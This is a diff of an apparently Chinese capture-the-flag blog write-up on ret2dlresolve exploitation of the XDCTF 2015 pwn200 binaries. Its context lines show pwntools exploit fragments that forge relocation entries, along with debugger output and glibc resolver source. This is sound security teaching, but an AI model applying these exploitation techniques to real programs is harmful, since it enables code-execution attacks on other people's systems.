@@ -26,9 +26,9 @@
     
     <script src="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/jquery/jquery.min.js"></script>
     
-<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-hopscotch.css" type="text/css">
-<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"><link rel="alternate" href="/atom.xml" title="JackHCC" type="application/atom+xml">
-</head>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="JackHCC" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-hopscotch.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
 
 <body>
@@ -320,10 +320,105 @@
 
 
 
-<main class="container content">
+<main class="post-container content">
 
     
-    <!-- 文章内容详情 -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 30px;
+        bottom: 146px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
 <div id="artDetail">
     <div class="card">
         <div class="card-content article-info">
@@ -357,28 +452,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-08-18
+                    2021-08-20
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-08-25
+                    2021-08-30
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    45.8k
+                    45.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    221 分
+                    219 分
                 </div>
                 
 
@@ -1807,7 +1902,7 @@ plt0 <span class="token operator">=</span> elf<span class="token punctuation">.<
 got0 <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.got'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
 
 rel_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.rel.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
-<span class="token comment" spellcheck="true"># make base_stage+24 ---&gt; fake reloc</span>
+<span class="token comment" spellcheck="true"># make base_stage+24 ---> fake reloc</span>
 write_reloc_offset <span class="token operator">=</span> base_stage <span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">-</span> rel_plt
 write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
 r_info <span class="token operator">=</span> <span class="token number">0x607</span>
@@ -1935,11 +2030,11 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
    0xf7f77ffa    mov    esi, dword ptr gs:[0xc]
    0xf7f78001    test   esi, esi
    0xf7f78003    mov    ebx, 1
-   0xf7f78008    jne    0xf7f78078 &lt;0xf7f78078&gt;
+   0xf7f78008    jne    0xf7f78078 <0xf7f78078>
     ↓
    0xf7f78078    mov    dword ptr gs:[0x1c], 1
    0xf7f78083    mov    ebx, 5
-   0xf7f78088    jmp    0xf7f7800a &lt;0xf7f7800a&gt;
+   0xf7f78088    jmp    0xf7f7800a <0xf7f7800a>
 ───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
 00:0000│ esp  0x804a7dc ◂— 0x0
 ... ↓
@@ -1952,7 +2047,7 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
  ► f 0 f7f77fed
    f 1        0
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-pwndbg&gt; vmmap
+pwndbg> vmmap
 LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
  0x8048000  0x804a000 r-xp     2000 0      ./main_partial_relro_32
  0x8049000  0x804b000 rw-p     2000 0      [stack]
@@ -1974,13 +2069,13 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
       v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>以及源码可以知道程序是在访问 version 的 hash 时出错。</p>
-<pre class="line-numbers language-c"><code class="language-c">        <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-&gt;</span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span><span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
+<pre class="line-numbers language-c"><code class="language-c">        <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span><span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
         <span class="token punctuation">{</span>
             <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> <span class="token operator">*</span>vernum <span class="token operator">=</span>
                 <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">D_PTR</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span><span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span><span class="token punctuation">(</span>reloc<span class="token operator">-&gt;</span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span>
-            version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-&gt;</span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-&gt;</span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+            <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span><span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span>
+            version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-></span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-></span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
                 version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>进一步分析可以知道，因为我们伪造了 write 函数的重定位表项，其中 reloc-&gt;r_info 被设置成了比较大的值（由于 index_dynsym 离符号表比较远）。这时候，ndx 的值并不可预期，进而 version 的值也不可预期，因此可能出现不可预期的情况。</p>
@@ -2038,17 +2133,17 @@ ndx_addr: 0x80487a8<span aria-hidden="true" class="line-numbers-rows"><span></sp
 <p>可以发现，ndx_落入了 <code>.eh_frame</code> 节中。</p>
 <pre class="line-numbers language-assembly"><code class="language-assembly">.eh_frame:080487A8                 dw 442Ch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>进一步地，ndx 的值为 0x442C。显然不知道会索引到哪里去。</p>
-<pre class="line-numbers language-c"><code class="language-c">        <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-&gt;</span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span><span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
+<pre class="line-numbers language-c"><code class="language-c">        <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span><span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
         <span class="token punctuation">{</span>
             <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> <span class="token operator">*</span>vernum <span class="token operator">=</span>
                 <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">D_PTR</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span><span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span><span class="token punctuation">(</span>reloc<span class="token operator">-&gt;</span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span>
-            version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-&gt;</span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-&gt;</span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+            <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span><span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span>
+            version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-></span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-></span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
                 version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>通过动态调试，我们可以发现 l_versions 的起始地址，并且其中一共有 3 个元素。</p>
-<pre class="line-numbers language-assembly"><code class="language-assembly">pwndbg&gt; print *((struct link_map *)0xf7f0d940)
+<pre class="line-numbers language-assembly"><code class="language-assembly">pwndbg> print *((struct link_map *)0xf7f0d940)
 $4 = {
   l_addr = 0, 
   l_name = 0xf7f0dc2c "", 
@@ -2058,7 +2153,7 @@ $4 = {
   l_real = 0xf7f0d940, 
   l_ns = 0, 
   l_libname = 0xf7f0dc20, 
-  l_info = {0x0, 0x8049f0c, 0x8049f7c, 0x8049f74, 0x0, 0x8049f4c, 0x8049f54, 0x0, 0x0, 0x0, 0x8049f5c, 0x8049f64, 0x8049f14, 0x8049f1c, 0x0, 0x0, 0x0, 0x8049f94, 0x8049f9c, 0x8049fa4, 0x8049f84, 0x8049f6c, 0x0, 0x8049f8c, 0x0, 0x8049f24, 0x8049f34, 0x8049f2c, 0x8049f3c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8049fb4, 0x8049fac, 0x0 <repeats 13="" times="">, 0x8049fbc, 0x0 <repeats 25="" times="">, 0x8049f44}, 
+  l_info = {0x0, 0x8049f0c, 0x8049f7c, 0x8049f74, 0x0, 0x8049f4c, 0x8049f54, 0x0, 0x0, 0x0, 0x8049f5c, 0x8049f64, 0x8049f14, 0x8049f1c, 0x0, 0x0, 0x0, 0x8049f94, 0x8049f9c, 0x8049fa4, 0x8049f84, 0x8049f6c, 0x0, 0x8049f8c, 0x0, 0x8049f24, 0x8049f34, 0x8049f2c, 0x8049f3c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8049fb4, 0x8049fac, 0x0 <repeats 13 times>, 0x8049fbc, 0x0 <repeats 25 times>, 0x8049f44}, 
   l_phdr = 0x8048034, 
   l_entry = 134513632, 
   l_phnum = 9, 
@@ -2073,9 +2168,9 @@ $4 = {
   }, 
   l_loader = 0x0, 
   l_versions = 0xf7edf3f0, 
-  l_nversions = 3, <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></repeats></repeats></code></pre>
+  l_nversions = 3, <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>对应的分别为 </p>
-<pre class="line-numbers language-assembly"><code class="language-assembly">pwndbg&gt; print *((struct r_found_version[3] *)0xf7edf3f0)
+<pre class="line-numbers language-assembly"><code class="language-assembly">pwndbg> print *((struct r_found_version[3] *)0xf7edf3f0)
 $13 = {{
     name = 0x0, 
     hash = 0, 
@@ -2094,9 +2189,9 @@ $13 = {{
   }}
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>此时，计算得到的 version 地址为 0xf7f236b0，显然不在映射的内存区域。</p>
-<pre class="line-numbers language-assembly"><code class="language-assembly">pwndbg&gt; print /x 0xf7edf3f0+0x442C*16
+<pre class="line-numbers language-assembly"><code class="language-assembly">pwndbg> print /x 0xf7edf3f0+0x442C*16
 $16 = 0xf7f236b0
-pwndbg&gt; vmmap
+pwndbg> vmmap
 LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
  0x8048000  0x8049000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
  0x8049000  0x804a000 r--p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
@@ -2352,7 +2447,7 @@ ndx_addr: 0x80487c2
 0x0018: '\x1c\xa0\x04\x08' '\x1c\xa0\x04\x08\x07u\x02\x00'
 0x001c:  '\x07u\x02\x00'
 0x0020:           'aaaa' 'aaaa'
-0x0024:  '\xc0&amp;\x00\x00' '\xc0&amp;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00'
+0x0024:  '\xc0&\x00\x00' '\xc0&\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00'
 0x0028: '\x00\x00\x00\x00'
 0x002c: '\x00\x00\x00\x00'
 0x0030: '\x12\x00\x00\x00'
@@ -2574,12 +2669,12 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
  RSP  0x6009e0 (_DYNAMIC+216) —▸ 0x600ae8 (_GLOBAL_OFFSET_TABLE_) ◂— 0x0
  RIP  0x7f2512db3e69 (_dl_fixup+41) ◂— mov    rcx, qword ptr [r8 + 8]
 ──────[ DISASM ]────────
-   0x7f2512db3e52 &lt;_dl_fixup+18&gt;    mov    rdi, qword ptr [rax + 8]
-   0x7f2512db3e56 &lt;_dl_fixup+22&gt;    mov    rax, qword ptr [r10 + 0xf8]
-   0x7f2512db3e5d &lt;_dl_fixup+29&gt;    mov    rax, qword ptr [rax + 8]
-   0x7f2512db3e61 &lt;_dl_fixup+33&gt;    lea    r8, [rax + rdx*8]
-   0x7f2512db3e65 &lt;_dl_fixup+37&gt;    mov    rax, qword ptr [r10 + 0x70]
- ► 0x7f2512db3e69 &lt;_dl_fixup+41&gt;    mov    rcx, qword ptr [r8 + 8] &lt;0x7f2512ac3191&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+   0x7f2512db3e52 <_dl_fixup+18>    mov    rdi, qword ptr [rax + 8]
+   0x7f2512db3e56 <_dl_fixup+22>    mov    rax, qword ptr [r10 + 0xf8]
+   0x7f2512db3e5d <_dl_fixup+29>    mov    rax, qword ptr [rax + 8]
+   0x7f2512db3e61 <_dl_fixup+33>    lea    r8, [rax + rdx*8]
+   0x7f2512db3e65 <_dl_fixup+37>    mov    rax, qword ptr [r10 + 0x70]
+ ► 0x7f2512db3e69 <_dl_fixup+41>    mov    rcx, qword ptr [r8 + 8] <0x7f2512ac3191><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>经过逐步调试发现，在 <code>_dl_runtime_resolve</code> 会在栈中保存大量的数据</p>
 <pre class="line-numbers language-assembly"><code class="language-assembly">.text:00000000000177A0 ; __unwind {
 .text:00000000000177A0                 push    rbx
@@ -2606,7 +2701,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 .text:0000000000017811                 mov     rdi, [rbx+8]
 .text:0000000000017815                 call    sub_FE40<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>其中 qword_227808 处的值为0x0000000000000380。</p>
-<pre class="line-numbers language-assembly"><code class="language-assembly">pwndbg&gt; vmmap
+<pre class="line-numbers language-assembly"><code class="language-assembly">pwndbg> vmmap
 LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
           0x400000           0x401000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
           0x600000           0x601000 rw-p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
@@ -2624,10 +2719,10 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
     0x7fff26d19000     0x7fff26d1c000 r--p     3000 0      [vvar]
     0x7fff26d1c000     0x7fff26d1e000 r-xp     2000 0      [vdso]
 0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
-pwndbg&gt; x/gx 0x7f2512da4000+0x227808
-0x7f2512fcb808 &lt;_rtld_global_ro+168&gt;:    0x0000000000000380<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+pwndbg> x/gx 0x7f2512da4000+0x227808
+0x7f2512fcb808 <_rtld_global_ro+168>:    0x0000000000000380<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>当执行完下面的指令后</p>
-<pre class="line-numbers language-assembly"><code class="language-assembly"> ► 0x7f2512dbb7a8 &lt;_dl_runtime_resolve_xsavec+8&gt;     sub    rsp, qword ptr [rip + 0x210059] &lt;0x7f2512fcb808&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-assembly"><code class="language-assembly"> ► 0x7f2512dbb7a8 <_dl_runtime_resolve_xsavec+8>     sub    rsp, qword ptr [rip + 0x210059] <0x7f2512fcb808><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>栈地址到了 0x600a00（我们是将栈迁移到了 bss_addr+0x100，即 0x600C30），即到了 .dynamic 节中，后续在栈中保存数据时会破坏 .dynamic 节中的内容，最后导致了 dl_fixup 崩溃。</p>
 <pre><code>   0x7f2512dbb7a0 &lt;_dl_runtime_resolve_xsavec&gt;       push   rbx
    0x7f2512dbb7a1 &lt;_dl_runtime_resolve_xsavec+1&gt;     mov    rbx, rsp
@@ -2653,7 +2748,7 @@ pwndbg&gt; x/gx 0x7f2512da4000+0x227808
 <li>伪造的栈的数据一共有 392 （0x188）</li>
 </ul>
 <p>所以直接栈迁移到 bss节很容易出现问题。</p>
-<pre class="line-numbers language-assembly"><code class="language-assembly">pwndbg&gt; vmmap
+<pre class="line-numbers language-assembly"><code class="language-assembly">pwndbg> vmmap
 LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
           0x400000           0x401000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
           0x600000           0x601000 rw-p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
@@ -2967,25 +3062,25 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
   Elf64_Sxword        r_addend<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">/* Addend */</span>
 <span class="token punctuation">}</span> Elf64_Rela<span class="token punctuation">;</span>
 <span class="token comment" spellcheck="true">/* How to extract and insert information held in the r_info field.  */</span>
-<span class="token macro property">#<span class="token directive keyword">define</span> ELF64_R_SYM(i)                        ((i) &gt;&gt; 32)</span>
+<span class="token macro property">#<span class="token directive keyword">define</span> ELF64_R_SYM(i)                        ((i) >> 32)</span>
 <span class="token macro property">#<span class="token directive keyword">define</span> ELF64_R_TYPE(i)                        ((i) &amp; 0xffffffff)</span>
 <span class="token macro property">#<span class="token directive keyword">define</span> ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这里 Elf64_Addr、Elf64_Xword、Elf64_Sxword 都为 64 位，因此 Elf64_Rela 结构体的大小为 24 字节。</p>
 <p>根据 IDA 里的重定位表的信息可以知道，write 函数在符号表中的偏移为 1（0x100000007h&gt;&gt;32） 。</p>
 <pre class="line-numbers language-assembly"><code class="language-assembly">LOAD:0000000000400488 ; ELF JMPREL Relocation Table
-LOAD:0000000000400488                 Elf64_Rela &lt;601018h, 100000007h, 0&gt; ; R_X86_64_JUMP_SLOT write
-LOAD:00000000004004A0                 Elf64_Rela &lt;601020h, 200000007h, 0&gt; ; R_X86_64_JUMP_SLOT strlen
-LOAD:00000000004004B8                 Elf64_Rela &lt;601028h, 300000007h, 0&gt; ; R_X86_64_JUMP_SLOT setbuf
-LOAD:00000000004004D0                 Elf64_Rela &lt;601030h, 400000007h, 0&gt; ; R_X86_64_JUMP_SLOT read
+LOAD:0000000000400488                 Elf64_Rela <601018h, 100000007h, 0> ; R_X86_64_JUMP_SLOT write
+LOAD:00000000004004A0                 Elf64_Rela <601020h, 200000007h, 0> ; R_X86_64_JUMP_SLOT strlen
+LOAD:00000000004004B8                 Elf64_Rela <601028h, 300000007h, 0> ; R_X86_64_JUMP_SLOT setbuf
+LOAD:00000000004004D0                 Elf64_Rela <601030h, 400000007h, 0> ; R_X86_64_JUMP_SLOT read
 LOAD:00000000004004D0 LOAD            ends<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>确实在符号表中的偏移为 1。</p>
 <pre class="line-numbers language-shell"><code class="language-shell">LOAD:00000000004002C0 ; ELF Symbol Table
-LOAD:00000000004002C0      Elf64_Sym &lt;0&gt;
-LOAD:00000000004002D8      Elf64_Sym <offset awrite="" -="" offset="" byte_400398,="" 12h,="" 0,="" 0=""> ; "write"
-LOAD:00000000004002F0      Elf64_Sym <offset astrlen="" -="" offset="" byte_400398,="" 12h,="" 0,="" 0=""> ; "strlen"
-LOAD:0000000000400308      Elf64_Sym <offset asetbuf="" -="" offset="" byte_400398,="" 12h,="" 0,="" 0=""> ; "setbuf"
-LOAD:0000000000400320      Elf64_Sym <offset aread="" -="" offset="" byte_400398,="" 12h,="" 0,="" 0=""> ; "read"
-...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></offset></offset></offset></offset></code></pre>
+LOAD:00000000004002C0      Elf64_Sym <0>
+LOAD:00000000004002D8      Elf64_Sym <offset aWrite - offset byte_400398, 12h, 0, 0, 0, 0> ; "write"
+LOAD:00000000004002F0      Elf64_Sym <offset aStrlen - offset byte_400398, 12h, 0, 0, 0, 0> ; "strlen"
+LOAD:0000000000400308      Elf64_Sym <offset aSetbuf - offset byte_400398, 12h, 0, 0, 0, 0> ; "setbuf"
+LOAD:0000000000400320      Elf64_Sym <offset aRead - offset byte_400398, 12h, 0, 0, 0, 0> ; "read"
+...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>在 64 位下，Elf64_Sym 结构体为</p>
 <pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span>
 <span class="token punctuation">{</span>
@@ -3182,12 +3277,12 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 <p>显然都在非映射的内存区域。因此，我们得考虑考虑其它办法。通过阅读 dl_fixup 的代码</p>
 <pre class="line-numbers language-c"><code class="language-c">        <span class="token comment" spellcheck="true">// 获取符号的版本信息</span>
         <span class="token keyword">const</span> <span class="token keyword">struct</span> r_found_version <span class="token operator">*</span>version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-&gt;</span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span><span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span><span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
         <span class="token punctuation">{</span>
